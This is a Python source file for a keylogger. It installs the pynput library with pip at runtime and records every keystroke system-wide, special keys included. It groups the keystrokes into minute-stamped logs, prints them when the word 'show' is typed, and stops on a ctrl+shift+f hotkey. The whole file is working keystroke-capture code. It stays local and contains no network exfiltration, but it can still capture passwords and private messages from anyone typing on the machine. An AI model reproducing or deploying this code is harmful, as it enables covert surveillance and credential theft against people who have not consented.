import subprocess , sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
from threading import Timer
from datetime import datetime
from pynput.keyboard import Listener, Key, GlobalHotKeys

temporary_typing_list = list()
track_to_password = ['', '', '', '']
password_to_view = ['s', 'h', 'o', 'w']
software_log = dict()
bac_log = dict()

def on_press(key):
    """
    This function receives the keys that the user has entered on the keyboard and sorts them by their type, alphanumeric keys separately, and special keys separately.
    :param key: Gets the key pressed.
    """
    if is_the_key_alphanumeric(key):
        convert_string_to_alphanumeric_key(key)
    else:
        handling_special_keys(key)

def is_the_key_alphanumeric(key):
    """
    This function checks if the key is alphanumeric.
    :param key: The key pressed
    :return: True if it is alphanumeric and False if it is not.
    """
    try:
        x = key.char
        return True
    except AttributeError:
        return False

def convert_string_to_alphanumeric_key(key):
    """
    This function converts a string to alphanumeric keys.
    :param key: The key pressed
    """
    key = str(key)
    trimming_unnecessary_characters(key)

def trimming_unnecessary_characters(key):
    """
    This function cuts off the characters that are not necessary for the rest of the process.
    :param key: The key pressed as a string
    """
    key = key[1:-1]
    adding_a_key_to_the_list(key)

def handling_special_keys(key):
    """
    This function converts the special keys according to the dictionary.
    :param key: The special keys pressed
    """
    keys_dict = {
        "Key.alt": "(*alt*)",
        "Key.alt_l": "(*alt_l*)",
        "Key.alt_r": "(*alt_r*)",
        "Key.alt_gr": "(*alt_gr*)",
        "Key.backspace": "\b",
        "Key.caps_lock": "(*caps_lock*)",
        "Key.cmd": "(*cmd*)",
        "Key.cmd_l": "(*cmd_l*)",
        "Key.cmd_r": "(*cmd_r*)",
        "Key.ctrl": "(*ctrl*)",
        "Key.ctrl_l": "(*ctrl_l*)",
        "Key.ctrl_r": "(*ctrl_r*)",
        "Key.delete": "(*delete*)",
        "Key.down": "(*down*)",
        "Key.end": "(*end*)",
        "Key.enter": "\n",
        "Key.esc": "(*esc*)",
        "Key.f1": "(*f1*)",
        "Key.f2": "(*f2*)",
        "Key.f3": "(*f3*)",
        "Key.f4": "(*f4*)",
        "Key.f5": "(*f5*)",
        "Key.f6": "(*f6*)",
        "Key.f7": "(*f7*)",
        "Key.f8": "(*f8*)",
        "Key.f9": "(*f9*)",
        "Key.f10": "(*f10*)",
        "Key.f11": "(*f11*)",
        "Key.f12": "(*f12*)",
        "Key.f13": "(*f13*)",
        "Key.f14": "(*f14*)",
        "Key.f15": "(*f15*)",
        "Key.f16": "(*f16*)",
        "Key.f17": "(*f17*)",
        "Key.f18": "(*f18*)",
        "Key.f19": "(*f19*)",
        "Key.f20": "(*f20*)",
        "Key.home": "(*home*)",
        "Key.left": "(*left*)",
        "Key.page_down": "(*page_down*)",
        "Key.page_up": "(*page_up*)",
        "Key.right": "(*right*)",
        "Key.shift": "(*shift*)",
        "Key.shift_l": "(*shift_l*)",
        "Key.shift_r": "(*shift_r*)",
        "Key.space": " ",
        "Key.tab": "\t",
        "Key.up": "(*up*)",
        "Key.media_play_pause": "(*media_play_pause*)",
        "Key.media_volume_mute": "(*media_volume_mute*)",
        "Key.media_volume_down": "(*media_volume_down*)",
        "Key.media_volume_up": "(*media_volume_up*)",
        "Key.media_previous": "(*media_previous*)",
        "Key.media_next": "(*media_next*)",
        "Key.insert": "(*insert*)",
        "Key.menu": "(*menu*)",
        "Key.num_lock": "(*num_lock*)",
        "Key.pause": "(*pause*)",
        "Key.print_screen": "(*print_screen*)",
        "Key.scroll_lock": "(*scroll_lock*)"
    }
    if str(key) in keys_dict:
        key = keys_dict[str(key)]
        adding_a_key_to_the_list(key)
    else:
        pass

def adding_a_key_to_the_list(key):
    """
    This function adds the keyboard keys to the list.
    :param key: Keyboard keystrokes as a string (both alphanumeric and special)
    """
    temporary_typing_list.append(key)
    tracking_after_viewing_command(key)

def tracking_after_viewing_command(key):
    """
    This function tracks the number of recent keystrokes for password tracking purposes.
    :param key: The last key pressed as a string
    """
    track_to_password.append(key)
    track_to_password.pop(0)
    if track_to_password == password_to_view:
        copying_the_dictionary_for_backup()




def starting_the_dictionary_transfer_process():
    """
    This function begins the process of converting the list into a dictionary where each key will be the date, hour, and minute it was added, and each value will be a string of all the typings at that time.
    """
    global timer
    timer = Timer(60, starting_the_dictionary_transfer_process)
    timer.start()
    copying_and_clearing_the_list()

def copying_and_clearing_the_list():
    """
    This function copies the contents of the list to a new list and empties the old list.
    """
    new_list = temporary_typing_list[:]
    temporary_typing_list.clear()
    converting_a_list_to_a_string(new_list)

def converting_a_list_to_a_string(lst):
    """
    This function takes a list and converts it to a string without spaces between elements.
    :param lst: Accepting the new list
    """
    my_string = "".join(lst)
    dictionary_entry_with_timestamp(my_string)

def dictionary_entry_with_timestamp(a:str):
    """
    This function inserts the string into a dictionary where the key is the current timestamp and the value is the string.
    :param a: The string to insert
    """
    software_log[datetime.now().strftime("%Y-%m-%d %H:%M")] = a




def copying_the_dictionary_for_backup():
    """
    This function creates a copy of the dictionary for backup purposes
    """
    bac_log.update(software_log)
    sorting_dictionary_keys()

def sorting_dictionary_keys():
    """
    This function creates a list of the dictionary keys ordered from oldest to newest
    """
    order = sorted(software_log.keys())
    printing_and_deleting_dictionary_keys(order)

def printing_and_deleting_dictionary_keys(order):
    """
    This function prints in the order of the list it receives the dictionary keys and the values each in a row by itself
    :param order: You get a list of keys to work on
    """
    for key in order:
        print(key)
        print(software_log[key])
        software_log.pop(key)

def stopping_the_software():
    """
    This function is activated when a defined keyboard shortcut is pressed, and it performs a shutdown on all software activity step by step.
    """
    global keys, listener, timer
    keys.stop()
    listener.stop()
    timer.cancel()

def main():
    """
    This function is called when the program starts.
    """
    global keys, listener, timer
    # This class handles keystrokes.
    listener = Listener(on_press=on_press)
    listener.start()
    # This class handles saving the typings to the log.
    timer = Timer(60, starting_the_dictionary_transfer_process)
    timer.start()
    # This class runs lightning fast and waits for a predefined key combination.
    with GlobalHotKeys(
            {'<ctrl>+<shift>+f':stopping_the_software}
    ) as keys:
        keys.join()


if __name__ == '__main__':
    main()
